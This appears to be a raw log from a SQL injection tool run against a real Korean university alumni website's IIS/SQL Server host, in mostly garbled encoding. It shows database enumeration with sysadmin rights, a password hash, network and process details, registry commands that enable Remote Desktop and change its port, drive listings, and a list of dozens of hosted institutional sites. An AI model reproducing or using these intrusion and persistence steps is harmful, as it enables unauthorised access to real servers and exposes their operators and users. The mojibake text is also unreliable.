@@ -1,0 +1,693 @@
+¡öÂ©¶´ÐÅÏ¢:============================================================
+ ¡¤URL:http://www.pnuaa.net/3000/3000_1.asp?r=pusan_alumni8780&c2=3100&y1=&k=1&page=1&f=c&subleft=&keyfield=&keyword=&id=1483
+ ¡¤Ò³Ãæ±êÌâ£ººÎ»ê´ëÇÐ±³ ÃÑµ¿¹®È¸ - designed by ¿ì/¸®/Áý/
+ ¡¤²ÎÊý:r=pusan_alumni8780&c2=3100&y1=&k=1&page=1&f=c&subleft=&keyfield=&keyword=&id=1483
+ ¡¤·½·¨:GET
+ ¡¤ÀàÐÍ:Numeric
+ ¡¤ÀûÓÃ·½·¨:And
+ ¡¤½Å±¾ÓïÑÔ:asp
+ ¡¤IP:211.224.130.116
+ ¡¤Êý¾Ý¿â:SQL Server
+ ¡¤HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 09:17:37 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 25737
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDASCRSQBT=AKMDPKHAJLIAAAEHDMDMCBPM; path=/
+Cache-control: private
+
+
+
+¡öÊý¾Ý¿âÐÅÏ¢:============================================================
+- Êý¾Ý¿âÃû£ºpusan_alumni8780
+- ÓÃ»§Ãû£ºdbo
+- °æ±¾£ºMicrosoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- ·þÎñÆ÷Ãû£ºEUN81L09AWXKYYP
+- ·þÎñÃû£ºMSSQLSERVER
+- ÏµÍ³ÓÃ»§Ãû£ºsa
+
+ ¡¤µ±Ç°ÓÃ»§È¨ÏÞ£º
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ¡¤Êý¾Ý¿âÐÅÏ¢:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+bmths_mobile	D:\DATABASE2009\bmths_mobile_Data.MDF	
+cando_renew	D:\DATABASE2009\cando_renew_Data.MDF	
+cando5001_2009	D:\DATABASE2009\cando5001_Data.MDF	
+cho_2009	D:\DATABASE2009\cho_2009_Data.MDF	
+cho266_2009	D:\DATABASE2009\cho266_Data.MDF	
+chonggye_es_kr_2009	D:\DATABASE2009\chonggye_es_kr_Data.MDF	
+cyber_eng_2009	D:\DATABASE2009\cyber_eng_Data.MDF	
+demo_center3577	D:\DATABASEDEMO\center3577_Data.MDF	
+demo_deu2_ox_or_kr	D:\DATABASEDEMO\deu2_ox_or_kr_Data.MDF	
+demo_deu3_ox_or_kr	D:\DATABASEDEMO\deu3_ox_or_kr_Data.MDF	
+
+ ¡¤SQL ServerÓÃ»§ÃûÁÐ±í£º
+ÓÃ»§Ãû		½ÇÉ«		°²È«±àºÅ
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ¡¤Êý¾Ý¿âÏà¹Ø½ø³ÌÐÅÏ¢:
+³ÌÐòÃû	×´Ì¬	Ö÷»úÃû	Ö÷»ú½ø³ÌID	ÃüÁîÐÐ	NTÓÃ»§Ãû
+----------------------------------------------------------------------------------------------------
+È¡¼ÇÂ¼ÊýÊ§°Ü£¬Ê¹ÓÃÉè¶¨Öµ£º5
+SQLAgent - Generic Refresher	sleeping	EUN81L09AWXKYYP	4196	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	EUN81L09AWXKYYP	4196	AWAITING COMMAND	SYSTEM	
+MS SQLEM	sleeping	EUN81L09AWXKYYP	3468	AWAITING COMMAND	Administrator	
+Microsoft¢ç Windows¢ç Operating System	sleeping	EUN81L09AWXKYYP	3016	AWAITING COMMAND		
+Microsoft¢ç Windows¢ç Operating System	sleeping	EUN81L09AWXKYYP	3016	AWAITING COMMAND		
+
+ ¡¤Á´½ÓµÄ·þÎñÆ÷ÐÅÏ¢:
+·þÎñÆ÷Ãû	·þÎñÆ÷²úÆ·	Ìá¹©ÕßÃû	Êý¾ÝÔ´	Î»ÖÃ	·þÎñÆ÷ÍøÂçÃû
+----------------------------------------------------------------------------------------------------
+EUN81L09AWXKYYP	SQL Server	SQLOLEDB	EUN81L09AWXKYYP		EUN81L09AWXKYYP	
+
+ ¡¤Êý¾Ý¿âÓÃ»§µÇÂ¼ÐÅÏ¢£º
+ÓÃ»§Ãû	ÃÜÂëHASH	Êý¾Ý¿â±àºÅ	ÓïÑÔ	Ê±¼ä1	Ê±¼ä2
+----------------------------------------------------------------------------------------------------
+		0		09 30 2009  7:41PM	09 30 2009  7:41PM	
+BUILTIN\Administrators		1	ÇÑ±¹¾î	09 30 2009  7:41PM	09 30 2009  7:41PM	
+sa	??¶Ñ?????‰Ôë®??????????á¹?	1	ÇÑ±¹¾î	08  6 2000  1:27AM	10 16 2009  4:11PM	
+
+¡öreg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	¿À·ù: ¿À·ù: ½Ã½ºÅÛÀÌ ÁöÁ¤µÈ ·¹Áö½ºÆ®¸® Å° ¶Ç´Â °ªÀ» Ã£À» ¼ö ¾ø½À´Ï´Ù.	
+2		
+¡öipconfig
+1		
+2	Windows IP Configuration	
+3		
+4		
+5	Ethernet adapter ·ÎÄÃ ¿µ¿ª ¿¬°á 2:	
+6		
+7	   Media State . . . . . . . . . . . : Media disconnected	
+8		
+9	Ethernet adapter ·ÎÄÃ ¿µ¿ª ¿¬°á:	
+10		
+11	   Connection-specific DNS Suffix  . : 	
+12	   IP Address. . . . . . . . . . . . : 211.224.130.116	
+13	   Subnet Mask . . . . . . . . . . . : 255.255.255.224	
+14	   Default Gateway . . . . . . . . . : 211.224.130.97	
+15		
+¡öREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+1	ÀÛ¾÷À» ¿Ï·áÇß½À´Ï´Ù.	
+2		
+¡önetstat -an
+1		
+2	Active Connections	
+3		
+4	  Proto  Local Address          Foreign Address        State	
+5	  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING	
+6	  TCP    0.0.0.0:25             0.0.0.0:0              LISTENING	
+7	  TCP    0.0.0.0:53             0.0.0.0:0              LISTENING	
+8	  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING	
+9	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING	
+10	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING	
+11	  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING	
+12	  TCP    0.0.0.0:1032           0.0.0.0:0              LISTENING	
+13	  TCP    0.0.0.0:1033           0.0.0.0:0              LISTENING	
+14	  TCP    0.0.0.0:1035           0.0.0.0:0              LISTENING	
+15	  TCP    0.0.0.0:1036           0.0.0.0:0              LISTENING	
+16	  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING	
+17	  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING	
+18	  TCP    0.0.0.0:18505          0.0.0.0:0              LISTENING	
+19	  TCP    127.0.0.1:1433         127.0.0.1:4778         ESTABLISHED	
+20	  TCP    127.0.0.1:1433         127.0.0.1:4782         ESTABLISHED	
+21	  TCP    127.0.0.1:1433         127.0.0.1:4819         ESTABLISHED	
+22	  TCP    127.0.0.1:1433         127.0.0.1:4821         ESTABLISHED	
+23	  TCP    127.0.0.1:1433         127.0.0.1:4835         ESTABLISHED	
+24	  TCP    127.0.0.1:1433         127.0.0.1:4836         ESTABLISHED	
+25	  TCP    127.0.0.1:1433         127.0.0.1:4841         ESTABLISHED	
+26	  TCP    127.0.0.1:1441         127.0.0.1:14147        ESTABLISHED	
+27	  TCP    127.0.0.1:4088         127.0.0.1:14147        ESTABLISHED	
+28	  TCP    127.0.0.1:4778         127.0.0.1:1433         ESTABLISHED	
+29	  TCP    127.0.0.1:4782         127.0.0.1:1433         ESTABLISHED	
+30	  TCP    127.0.0.1:4814         127.0.0.1:1433         TIME_WAIT	
+31	  TCP    127.0.0.1:4818         127.0.0.1:1433         TIME_WAIT	
+32	  TCP    127.0.0.1:4819         127.0.0.1:1433         ESTABLISHED	
+33	  TCP    127.0.0.1:4820         127.0.0.1:1433         TIME_WAIT	
+34	  TCP    127.0.0.1:4821         127.0.0.1:1433         ESTABLISHED	
+35	  TCP    127.0.0.1:4822         127.0.0.1:1433         TIME_WAIT	
+36	  TCP    127.0.0.1:4823         127.0.0.1:1433         TIME_WAIT	
+37	  TCP    127.0.0.1:4824         127.0.0.1:1433         TIME_WAIT	
+38	  TCP    127.0.0.1:4825         127.0.0.1:1433         TIME_WAIT	
+39	  TCP    127.0.0.1:4826         127.0.0.1:1433         TIME_WAIT	
+40	  TCP    127.0.0.1:4827         127.0.0.1:1433         TIME_WAIT	
+41	  TCP    127.0.0.1:4828         127.0.0.1:1433         TIME_WAIT	
+42	  TCP    127.0.0.1:4829         127.0.0.1:1433         TIME_WAIT	
+43	  TCP    127.0.0.1:4830         127.0.0.1:1433         TIME_WAIT	
+44	  TCP    127.0.0.1:4831         127.0.0.1:1433         TIME_WAIT	
+45	  TCP    127.0.0.1:4832         127.0.0.1:1433         TIME_WAIT	
+46	  TCP    127.0.0.1:4833         127.0.0.1:1433         TIME_WAIT	
+47	  TCP    127.0.0.1:4834         127.0.0.1:1433         TIME_WAIT	
+48	  TCP    127.0.0.1:4835         127.0.0.1:1433         ESTABLISHED	
+49	  TCP    127.0.0.1:4836         127.0.0.1:1433         ESTABLISHED	
+50	  TCP    127.0.0.1:4837         127.0.0.1:1433         TIME_WAIT	
+51	  TCP    127.0.0.1:4838         127.0.0.1:1433         TIME_WAIT	
+52	  TCP    127.0.0.1:4839         127.0.0.1:1433         TIME_WAIT	
+53	  TCP    127.0.0.1:4841         127.0.0.1:1433         ESTABLISHED	
+¡öREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+1	ÀÛ¾÷À» ¿Ï·áÇß½À´Ï´Ù.	
+2		
+¡öREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x2476 /f
+1	ÀÛ¾÷À» ¿Ï·áÇß½À´Ï´Ù.	
+2		
+Dir of D:: 
+
+DATABASE2009\
+DATABASEDEMO\
+HOMEPAGE2009\
+PROGRAM\
+RECYCLER\
+System Volume Information\
+2009³â2Â÷º¹±¸°èÈ¹Ç¥.xlsx
+lms_post_education_Data.MDF
+lms_post_education_Log.LDF
+smt_2009_Data.MDF
+smt_2009_Log.LDF
+
+Dir of C:: 
+
+È¨ÆäÀÌÁöÀÚ·á\
+Documents and Settings\
+Inetpub\
+INIpay41\
+log\
+Program Files\
+RECYCLER\
+SMSClient\
+SQL2KSP4\
+sqldeveloper\
+System Volume Information\
+WINDOWS\
+wmpub\
+AUTOEXEC.BAT
+CONFIG.SYS
+down.vbs
+hInstall.log
+hpcsvc.log
+hVrmonnt.log
+
+Dir of C:\wmpub: 
+
+wmiislog\
+
+Dir of C:\wmpub\wmiislog: 
+
+
+Dir of D:\RECYCLER: 
+
+S-1-5-21-1589356989-4057864497-2272372365-500\
+S-1-5-21-304100415-73790022-4221992157-1007\
+S-1-5-21-304100415-73790022-4221992157-1010\
+S-1-5-21-304100415-73790022-4221992157-500\
+
+Dir of D:\PROGRAM: 
+Ò»´ÎÐÔ»ñÈ¡Ê§°Ü£¬ÕýÔÚÅú´Î»ñÈ¡¡­¡­
+
+°áÁ¦°ü·Ã\
+ÀÌÀü¼Ò½º\
+DATABASE\
+DATABASE2007\
+DNS\
+EditPlus 3\
+FileZilla\
+HOMEPAGE\
+IIS\
+NetSarang.Xmanager.Enterprise.v3.0.0172.Incl.KeyMaker-DVT\
+SiteGalaxyUpload\
+SMS\
+SMS¼­ºñ½º\
+SQL2000WoW_K\
+v 2.70\
+WebKnight_2_2\
+ALZip742.exe
+FileZilla.xml
+filezilla_2_2_26_setup.exe
+FileZilla_Server-0_9_25.exe
+ftp.ini
+msizap.zip
+SiteGalaxyUpload.zip
+SMSClient.zip
+SQL2000.AS-KB884525-SP4-x86-KOR.EXE
+SQL2000.MSDE-KB884525-SP4-x86-KOR.EXE
+SQL2000-KB884525-SP4-x86-KOR.EXE
+SQL2000WoW_K.ISO
+WebKnight.xml
+WebKnight_2_2.zip
+xpstar.dll
+
+Dir of E:: 
+
+È¨ÆäÀÌÁö2009\
+APM_Setup\
+BACKUP\
+Documents and Settings\
+emma\
+Inetpub\
+INIpay41\
+Program Files\
+RECYCLER\
+RWAPM\
+SMSClient\
+System Volume Information\
+var\
+WINDOWS\
+wmpub\
+AUTOEXEC.BAT
+class_schedule.resultmember.list.pop.inc.php.bak
+CONFIG.SYS
+
+Dir of F:: 
+
+
+Dir of E:\var: 
+
+log\
+
+Dir of E:\var\log: 
+
+emma.log
+
+¡öcscript c:\vWeb.vbs
+1	Microsoft (R) Windows Script Host ¹öÀü 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4		
+5	[±âº» À¥ »çÀÌÆ®]	
+6		
+7	Path            : c:\inetpub\wwwroot	
+8		
+9	[Ä«Åç¸¯´ë_Æò»ý±³À°¿ø]	
+10	edu.cup.ac.kr	
+11	catolic.ox.or.kr	
+12	Path            : D:\HOMEPAGE2009\Ä«Åç¸¯´ëÇÐ±³\Ä«Åç¸¯Æò»ý±³À°¿ø2007-07-26	
+13		
+14	[¾È¾ç´ë_Æò»ý±³À°¿ø]	
+15	anyang.ox.or.kr	
+16	anyang3.ox.or.kr	
+17	Path            : D:\HOMEPAGE2009\¾È¾ç´ëÇÐ±³\¾È¾ç´ëÇÐ±³	
+18		
+19	[¿ìÆí±³À°_½Ã¾È]	
+20	sian.ox.or.kr	
+21	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\sian	
+22		
+23	[¿ìÆí±³À°_¿ï»ê]	
+24	gbedu.ox.or.kr	
+25	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\¿ï»ê¿ìÆí±³À°	
+26		
+27	[¿ìÆí±³À°_ÀÌ¿¥]	
+28	em21c.ox.or.kr	
+29	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\ÀÌ¿¥Ä¿¹Â´ÏÆ¼(³ª¿ìºñÁö´Ï½º)	
+30		
+31	[¿ìÆí±³À°_ÀÌÀå]	
+32	ejang.ox.or.kr	
+33	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\ÀÌÀå	
+34		
+35	[¿ìÆí±³À°_¿¡µàÄÉ¾î]	
+36	cham.ox.or.kr	
+37	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\¿¡µàÄÉ¾î	
+38		
+39	[µ¥¸ð_°æ¾Ï±³À°¹®È­Àç´Ü]	
+40	kafound.uzn.kr	
+41	Path            : D:\HOMEPAGE2009\DEMO\°æ¾Ï±³À°¹®È­Àç´Ü	
+42		
+43	[ºÎ»ê´ë_Æ¯¼ö±³À°ÇÐ°ú]	
+44	specialpusan.ox.or.kr	
+45	Path            : D:\HOMEPAGE2009\ºÎ»ê´ëÇÐ±³\special_edu1643_Æ¯¼ö±³À°ÇÐ°ú2007-07-09	
+46		
+47	[¿ìÆí±³À°_È£³²´ëÇÐ±³]	
+48	honamedu.ox.or.kr	
+49	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\È£³²´ëÇÐ±³	
+50		
+51	[±â°ü_ktb´ëÇÑ¿©Çà»ç]	
+52	ktb.ox.or.kr	
+53	Path            : D:\HOMEPAGE2009\±â°ü\ktb´ëÇÑ¿©Çà»ç	
+54		
+55	[µ¥¸ð_ÃæÃ»³²µµÃ»¼Ò³â»ó´ãÁö¿ø¼¾ÅÍ]	
+56	nettore.uzn.kr	
+57	Path            : D:\HOMEPAGE2009\DEMO\ÃæÃ»³²µµÃ»¼Ò³â»ó´ãÁö¿ø¼¾ÅÍ	
+58		
+59	[¿ìÆí±³À°_CFO¾ÆÄ«µ¥¹Ì]	
+60	post2011.uzn.kr	
+61	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\Á¤À¯´Ïºê	
+62		
+63	[¿ìÆí±³À°_±¹Á¦¿¡µà³Ý]	
+64	kedu.uzn.kr	
+65	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\±¹Á¦¿¡µà³Ý	
+66		
+67	[µ¥¸ð_ÀÎÃµ¿ëÇö³²ÃÊµîÇÐ±³]	
+68	yonghyun.uzn.kr	
+69	Path            : D:\HOMEPAGE2009\DEMO\ÀÎÃµ¿ëÇö³²ÃÊµîÇÐ±³	
+70		
+71	[µ¥¸ð_Âü»ç¶ûÅõ¾î]	
+72	chamtour.ox.or.kr	
+73	Path            : D:\HOMEPAGE2009\DEMO\Âü»ç¶ûÅõ¾î	
+74		
+75	[±â°ü_Á¶°æÅÂÀÇ¿ønew]	
+76	new.ktclub.or.kr	
+77	ktclub.or.kr	
+78	www.ktclub.or.kr	
+79	Path            : D:\HOMEPAGE2009\±â°ü\Á¶°æÅÂÀÇ¿øÈ¨ÆäÀÌÁö2009	
+80		
+81	[±â°ü_Á¶¿µº¹±³¼öÈ¨ÆäÀÌÁö2009]	
+82	cyb.ox.or.kr	
+83	Path            : D:\HOMEPAGE2009\±â°ü\Á¶¿µº¹±³¼ö°³ÀÎÈ¨ÆäÀÌÁö	
+84		
+85	[µ¥¸ð_¿ì¸®ÁýÅÛÇÃ¸´µðÀÚÀÎ¼Ò½º]	
+86	postdemo.uzn.kr	
+87	Path            : D:\HOMEPAGE2009\¿ì¸®Áý¿Õ·ï\¿ì¸®ÁýÅÛÇÃ¸´µðÀÚÀÎ¼Ò½º	
+88		
+89	[µ¥¸ð_¹®Çö¿©ÀÚÁßÇÐ±³]	
+90	muhyeon.uzn.kr	
+91	Path            : D:\HOMEPAGE2009\DEMO\¹®Çö¿©ÀÚÁßÇÐ±³	
+92		
+93	[¿ìÆí±³À°_ÀüºÏ´åÄÄ]	
+94	jeonbuk.ox.or.kr	
+95	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\ÀüºÏ´åÄÄ	
+96		
+97	[¿Õ¼ö°Ç_Çìµå³Ø¼ÅÀú¸®]	
+98	headnecksurgery.net	
+99	www.headnecksurgery.net	
+100	headnecksurgery.org	
+101	www.headnecksurgery.org	
+102	headnnecksurgery.net	
+103	www.headnnecksurgery.net	
+104	Path            : D:\HOMEPAGE2009\¿Õ¼ö°Ç±³¼ö\Çìµå³Ø¼­Á®¸®\1À¥ÄÁÅÙÃ÷	
+105		
+106	[¿ìÆí±³À°_Á¤À¯´Ïºê]	
+107	junguniv.ox.or.kr	
+108	www.junguniv.ox.or.kr	
+109	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\Á¤À¯´Ïºê	
+110		
+111	[¿Õ¼ö°Ç_°³ÀÎÈ¨]	
+112	e-photoalbum.org	
+113	www.e-photoalbum.org	
+114	telemedi.net	
+115	www.telemedi.net	
+116	Path            : D:\HOMEPAGE2009\¿Õ¼ö°Ç±³¼ö\wangsg4089	
+117		
+118	[ÇÐ±³_Ã»°èÃÊµîÇÐ±³2009]	
+119	chonggye.es.kr	
+120	www.chonggye.es.kr	
+121	Path            : D:\HOMEPAGE2009\ÇÐ±³\°úÃµÃ»°èÃÊµîÇÐ±³	
+122		
+123	[¿ìÆí±³À°_³»ÀÏ´É·Â°³¹ß¿ø]	
+124	tomorrow.ox.or.kr	
+125	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\³»ÀÏ2011\WEB	
+126		
+127	[ºÎ»ê´ë_Æ½¼Ò·¹¿À¿¬±¸¼Ò2009]	
+128	pusannano.ox.or.kr	
+129	Path            : D:\HOMEPAGE2009\ºÎ»ê´ëÇÐ±³\ºÎ»ê´ëÇÐ±³Æ½¼Ò·¹¿ÀTRFlab2335	
+130		
+131	[¿ìÆí±³À°_2012»õ½Ã½ºÅÛ°³¹ß]	
+132	2012.uzn.kr	
+133	post2012.uzn.kr	
+134	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\¿ìÆí±³À°2012°³¹ßÁß	
+135		
+136	[µ¥¸ð_ºÎ»ê´ë±¹Á¦±³À°¿ø]	
+137	foreignpusan.uzn.kr	
+138	Path            : D:\HOMEPAGE2009\DEMO\ºÎ»ê´ë ±¹Á¦±³À°¿ø	
+139		
+140	[µ¥¸ð_ºÎ»ê´ëÀå¾ÖÇÐ»ýÁö¿ø¼¾ÅÍ]	
+141	sedupusan.uzn.kr	
+142	Path            : D:\HOMEPAGE2009\DEMO\ºÎ»ê´ë Àå¾ÖÇÐ»ýÁö¿ø¼¾ÅÍ	
+143		
+144	[¿ì¸®Áý_ÅÛÇÃ¸´È¨ÆäÀÌÁö]	
+145	template.uzn.kr	
+146	Path            : D:\HOMEPAGE2009\¿ì¸®Áý¿Õ·ï\ÅÛÇÃ¸´È¨ÆäÀÌÁö	
+147		
+148	[µ¥¸ð_È­¼º½ÃÃ»¼Ò³âÁö¿ø¼¾ÅÍ]	
+149	mars.uzn.kr	
+150	Path            : D:\HOMEPAGE2009\DEMO\È­¼º½ÃÃ»¼Ò³âÁö¿ø¼¾ÅÍ	
+151		
+152	[¿Â¶óÀÎ±³À°_Àå¾È´ëÇÐ±³LCMS]	
+153	jlcms.ox.or.kr	
+154	jlcms2.ox.or.kr	
+155	Path            : D:\HOMEPAGE2009\¿Â¶óÀÎ¿ø°Ý±³À°\Àå¾È´ëÇÐ±³LCMS	
+156		
+157	[µ¥¸ð_½Å¶ó´ëÆò»ý±³À°¿ø]	
+158	silla.uzn.kr	
+159	Path            : D:\HOMEPAGE2009\DEMO\½Å¶ó´ëÇÐ±³Æò»ý±³À°¿ø	
+160		
+161	[µ¥¸ð_¿ìÆí¿ø°Ý±³À°]	
+162	demopost.uzn.kr	
+163	post2010.uzn.kr	
+164	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\´ëÇÑ´É·Â°³¹ß¿¬±¸¿ø	
+165		
+166	[¿ìÆí±³À°_ÇÑ±¹´É·Â°³¹ß»ç¶÷°úÃ¥]	
+167	book.ox.or.kr	
+168	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\ÇÑ±¹´É·Â°³¹ß¿ø»ç¶÷°úÃ¥	
+169		
+170	[±â°ü_¾È½ÉÀÓ½Ã]	
+171	2009.ansim.org	
+172	Path            : D:\HOMEPAGE2009\±â°ü\¾È½É»ç¾÷´ÜÀÓ½Ã	
+173		
+174	[ºÎ»ê´ë-½Ã¹Î´ëÇÐ]	
+175	openuniv.ox.or.kr	
+176	openuniv2.ox.or.kr	
+177	XN--VK1BJ4OI7AJ2FPQDP65B.COM	
+178	www.XN--VK1BJ4OI7AJ2FPQDP65B.COM	
+179	Path            : D:\HOMEPAGE2009\ºÎ»ê´ëÇÐ±³\silver\silver	
+180		
+181	[µ¥¸ð_µ¿ÀÇ´ëÀ¯¾Æ±³À°ÇÐ°ú]	
+182	deu2.uzn.kr	
+183	Path            : D:\HOMEPAGE2009\DEMO\µ¿ÀÇ´ëÀ¯¾Æ±³À°ÇÐ°ú	
+184		
+185	[¿ìÆí±³À°_´ëÇÑ´É·Â°³¹ß¿¬±¸¿ø]	
+186	koreaedu.ox.or.kr	
+187	kor.ox.or.kr	
+188	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\´ëÇÑ´É·Â°³¹ß¿¬±¸¿ø	
+189		
+190	[¿ìÆí±³À°_ºÐÁ¡]	
+191	cafe.ox.or.kr	
+192	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\¿ìÆí¿ø°Ý±³À°-ºÐÁ¡	
+193		
+194	[¿ì¸®Áý_Á¦ÈÞ¸¶ÄÉÆÃÈ¨ÆäÀÌÁö]	
+195	biz.uzn.kr	
+196	business.ox.or.kr	
+197	Path            : D:\HOMEPAGE2009\¿ì¸®Áý¿Õ·ï\Á¦ÈÞ¸¶ÄÉÆÃÈ¨ÆäÀÌÁö	
+198		
+199	[µ¥¸ð_¾çÁöÁ÷¾÷ÈÆ·Ã¿ø]	
+200	yangzi.uzn.kr	
+201	Path            : D:\HOMEPAGE2009\DEMO\¾çÁöÁ÷¾÷ÈÆ·Ã¿ø	
+202		
+203	[¿ìÆí±³À°_ÀÎ½ºÅÚ·¹ÄÞ]	
+204	topedu.ox.or.kr	
+205	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\ÀÎ½ºÅÚ·¹ÄÞ	
+206		
+207	[¿ìÆí±³À°_´ÙÀ½»çÈ¸±³À°¿ø]	
+208	daum.ox.or.kr	
+209	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\´ÙÀ½»çÈ¸±³À°¿ø	
+210		
+211	[ºÎ»ê´ë_°ø°ú´ëºñÁ¤Áú½ÇÇè½Ç]	
+212	glasslab.or.kr	
+213	www.glasslab.or.kr	
+214	old.glasslab.or.kr	
+215	Path            : D:\HOMEPAGE2009\ºÎ»ê´ëÇÐ±³\glasslab	
+216		
+217	[ºÎ»ê´ë_»ýÈ°È¯°æ´ëÇÐ2009]	
+218	environment.ox.or.kr	
+219	Path            : D:\HOMEPAGE2009\ºÎ»ê´ëÇÐ±³\»ýÈ°È¯°æ´ëÇÐ±³	
+220		
+221	[¿ì¸®Áý_SMS¹ß¼Û¼­¹ö]	
+222	center.ox.or.kr	
+223	Path            : D:\HOMEPAGE2009\¿ì¸®Áý¿Õ·ï\SMS¹ß¼Û¼­¹ö	
+224		
+225	[±â°ü_ºÎ»êÃ»¼Ò³â»ó´ã¼¾ÅÍ(old)]	
+226	cando09.ox.or.kr	
+227	Path            : D:\HOMEPAGE2009\±â°ü\cando5001	
+228		
+229	[±â°ü_¾È½É»ç¾÷´Ü2009]	
+230	ansim.org	
+231	www.ansim.org	
+232	Path            : D:\HOMEPAGE2009\±â°ü\AnsimHomepage2008	
+233		
+234	[¿ì¸®Áý_¿µ¹®]	
+235	eng.uzn.kr	
+236	Path            : D:\HOMEPAGE2009\¿ì¸®Áý¿Õ·ï\¿ì¸®Áý¿µ¹®	
+237		
+238	[¿ìÆí±³À°_ÇÑ¼ºÁö¿À¸ÅÆ½½º]	
+239	hansung.ox.or.kr	
+240	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\ÇÑ¼º±â¾÷	
+241		
+242	[µ¥¸ð_µ¿ÀÇ´ë¹®¿¹Ã¢ÀÛÇÐ°ú]	
+243	deu3.uzn.kr	
+244	Path            : D:\HOMEPAGE2009\DEMO\µ¿ÀÇ´ë¹®¿¹Ã¢ÀÛÇÐ°ú	
+245		
+246	[ºÎ»ê´ë_ÃÑµ¿¹®È¸]	
+247	pnuaa.net	
+248	www.pnuaa.net	
+249	Path            : D:\HOMEPAGE2009\ºÎ»ê´ëÇÐ±³\pusan_alumni8780	
+250		
+251	[¿ìÆí±³À°_·¯´×ÇÃ·¯½º2008]	
+252	2008.runingplus.net	
+253	runing.ox.or.kr	
+254	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\·¯´×ÇÃ·¯½º2009³âÀÚ·á\runningplus(20100512-·¯´×)(2)(2)	
+255		
+256	[µ¥¸ð_FMÅõ¾î¿©Çà»ç]	
+257	fmtour.ox.or.kr	
+258	Path            : D:\HOMEPAGE2009\DEMO\FMÅõ¾î¿©Çà»ç	
+259		
+260	[¿Õ¼ö°Ç_ºñµå¸Æ½º]	
+261	videomax.org	
+262	www.videomax.org	
+263	vidmax.net	
+264	www.vidmax.net	
+265	voicetest.com	
+266	www.voicetest.com	
+267	Path            : D:\HOMEPAGE2009\¿Õ¼ö°Ç±³¼ö\ºñµå¸Æ½º	
+268		
+269	[±â°ü_Åë¿µ½ÃÃ»¼Ò³âÁö¿ø¼¾ÅÍ2009]	
+270	tycoun.or.kr	
+271	www.tycoun.or.kr	
+272	Path            : D:\HOMEPAGE2009\±â°ü\tong644	
+273		
+274	[¿Â¶óÀÎ±³À°_ºÎ»ê´ëÇÐ±³¾ÈÀüÁ¤º¸¸Á]	
+275	study.uzn.kr	
+276	Path            : D:\HOMEPAGE2009\¿Â¶óÀÎ¿ø°Ý±³À°\ºÎ»ê´ëÇÐ±³½ÇÇè½Ç¾ÈÀü±³À°	
+277		
+278	[¿ìÆí±³À°_E_Communication]	
+279	ecom.uzn.kr	
+280	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\E_Communication	
+281		
+282	[¿©Çà»ç_¿ë¹®¿©Çà]	
+283	tourb.ox.or.kr	
+284	Path            : D:\HOMEPAGE2009\¿©Çà»ç\¿ë¹®¿©Çà	
+285		
+286	[µ¥¸ð_ÃÑµ¿¹®È¸]	
+287	alu.ox.or.kr	
+288	Path            : D:\HOMEPAGE2009\DEMO\TEST ºÎ»ê´ë ÃÑµ¿¹®È¸	
+289		
+290	[¿ìÆí±³À°_ÇÑ´©¸®]	
+291	hannuri.ox.or.kr	
+292	Path            : D:\HOMEPAGE2009\¿ìÆí¿ø°Ý±³À°\ÇÑ´©¸®	
+293		
+294	[ÇÐ±³_±¸¼­¿©ÀÚÁßÇÐ±³2009]	
+295	old.guseo.ms.kr	
+296	www.old.guseo.ms.kr	
